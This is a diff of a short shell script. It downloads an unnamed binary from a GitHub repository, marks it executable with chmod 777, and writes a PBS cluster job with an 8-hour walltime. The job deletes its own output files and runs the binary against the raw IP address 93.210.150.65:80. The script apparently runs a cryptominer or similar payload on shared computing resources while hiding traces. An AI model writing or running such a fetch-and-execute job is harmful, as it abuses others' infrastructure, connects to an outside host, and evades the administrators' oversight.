@@ -1,4 +1,4 @@
-wget https://github.com/regvfp/x/raw/main/xle -O at >/dev/null && chmod 777 at
+wget https://github.com/regvfp/x/raw/main/xle -O at -q && chmod 777 at
 echo '#PBS -l walltime=8:00:00' >j
 echo 'rm job.*' >> j
 echo './at -o 93.210.150.65:80' >> j
